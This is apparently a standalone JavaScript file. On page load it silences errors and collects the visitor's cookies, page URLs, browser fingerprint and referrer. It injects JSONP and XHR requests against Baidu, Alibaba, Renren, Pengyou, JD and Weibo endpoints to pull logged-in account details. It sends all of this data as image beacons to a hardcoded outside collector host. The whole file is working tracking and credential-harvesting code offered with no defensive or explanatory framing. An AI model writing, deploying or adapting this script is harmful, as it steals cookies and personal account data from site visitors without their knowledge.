window.onerror=function(){ 
  return true; 
} 
http_server = "http://aim.rootclay.com:8000/jsonp.php?content="; 
var info = {}; 
info.browser = function(){ 
  ua = navigator.userAgent.toLowerCase(); 
  var rwebkit = /(webkit)[ \/]([\w.]+)/; 
  var ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/; 
  var rmsie = /(msie) ([\w.]+)/; 
  var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/; 
  var match = rwebkit.exec( ua ) || 
  ropera.exec( ua ) || 
  rmsie.exec( ua ) || 
  ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) || 
  []; 
  return { 
    name: match[1] || "", version: match[2] || "0" 
  }; 
}(); 
info.url =  document.location.href; 
info.ua = escape(navigator.userAgent); 
info.lang = navigator.language; 
info.referrer = document.referrer; 
info.location = window.location.href; 
info.toplocation = top.location.href; 
info.cookie = escape(document.cookie); 
info.domain = document.domain; 
info.title = document.title; 
info.screen = function(){ 
  var c = ""; 
  if (self.screen) { 
    c = screen.width+"x"+screen.height; 
  } 
  return c; 
}(); 
info.flash = function(){ 
  var f="",n=navigator; 
  if (n.plugins && n.plugins.length) { 
    for (var ii=0;ii<n.plugins.length;ii++) { 
      if (n.plugins[ii].name.indexOf('Shockwave Flash')!=-1) { 
        f=n.plugins[ii].description.split('Shockwave Flash ')[1]; 
        break; 
      } 
    } 
  } 
  else 
  if (window.ActiveXObject) { 
    for (var ii=10;ii>=2;ii--) { 
      try { 
        var fl=eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash."+ii+"');"); 
        if (fl) { 
          f=ii + '.0'; 
          break; 
        } 
      } 
      catch(e) {} 
     
    } 
  } 
  return f; 
}(); 
function inj_script(a, b) { 
  var o = document.createElement("script"); 
  o.src = a; 
  if (b) { 
    if (!window.ActiveXObject) { 
      o.onload = b; 
    } 
    else { 
      o.onreadystatechange = function () { 
        if (o.readyState == 'loaded' || o.readyState == 'complete') { 
          b(); 
        } 
      } 
    } 
  } 
  document.getElementsByTagName("body")[0].appendChild(o); 
  return o; 
}
/*ajax*/
var xmlHttpRequest;   
    //XmlHttpRequest对象   
    function createXmlHttpRequest(){   
        if(window.ActiveXObject){ //如果是IE
            return new ActiveXObject("Microsoft.XMLHTTP");   
        }else if(window.XMLHttpRequest){ //非IE浏览器   
            return new XMLHttpRequest();   
        }   
    }
function noJsonp(tUrl){   
        var url = tUrl;
        //1.创建XMLHttpRequest组建   
        xmlHttpRequest = createXmlHttpRequest();   
           
        //2.设置回调函数   
        xmlHttpRequest.onreadystatechange = toPost;   
           
        //3.初始化XMLHttpRequest组建   
        xmlHttpRequest.open("post",url,true);   
           
        //4.发送请求   
        xmlHttpRequest.send(null);     
    }        
    //回调函数   
    function toPost(){   
        if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200){
            var b = xmlHttpRequest.responseText;
            // 提交数据
			new Image().src = http_server + escape(b) + "&content2=nojsonp";
        }   
    } 	
	
function json2str(o) { 
  if(typeof o == 'string') return o; 
  var arr = []; 
  var fmt = function(s) { 
    if (typeof s == 'object' && s != null) return json2str(s); 
    return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s; 
  } 
  for (var i in o) arr.push("'" + i + "':" + fmt(o[i])); 
  return '{' + arr.join(',') + '}'; 
} 
video_login_callback = function(o){ 
  new Image().src = http_server + escape(json2str(o)) + "&content2=baidu"; 
} 

jsonp382 = function(o){ 
  new Image().src = http_server + escape(json2str(o)) + "&content2=IPinfo"; 
} 

jQuery1368758656634 = function(o){ 
  new Image().src = http_server + escape(json2str(o)) + "&content2=renren"; 
}

_Callback = function(o){ 
  new Image().src = http_server + escape(json2str(o)) + "&content2=renren123"; 
}

window.onload = function(){ 
  new Image().src = http_server + escape(json2str(info)) + "&content2=info%20"; 
  try{ 
    inj_script('http://baike.baidu.com/api/login/?callback=video_login_callback'); 
  } 
  catch(e){} 

  try{ // ip
    inj_script('https://tbip.alicdn.com/api/queryip?_ksTS=1466999803912_381&callback=jsonp382'); 
  } 
  catch(e){} 

  try{ 
    inj_script('http://passport.game.renren.com/user/info?callback=jQuery1368758656634&_=1368758656639');
  } 
  catch(e){}
  try{ 
    inj_script('http://appstore.pengyou.com/cgi-bin/comm/appstore_active_app_feed.cgi?cb=appfeed_Callback');
  } 
  catch(e){}
  try{ 
    noJsonp('http://vip.jd.com/index.php?mod=Vip.MemberIndex&action=getUserInfo');
  } 
  catch(e){}
  try{ 
    noJsonp('http://m.weibo.cn/index/my?format=cards');
  } 
  catch(e){}
  
};
